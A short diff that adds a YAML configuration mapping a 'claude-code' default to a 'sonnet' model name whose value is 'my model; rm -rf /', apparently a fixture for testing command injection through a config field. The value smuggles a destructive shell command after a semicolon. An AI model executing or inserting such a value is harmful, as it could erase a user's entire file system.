@@ -1,0 +1,5 @@
+default: claude-code
+
+model-mapping:
+  claude-code:
+    sonnet: "my model; rm -rf /"
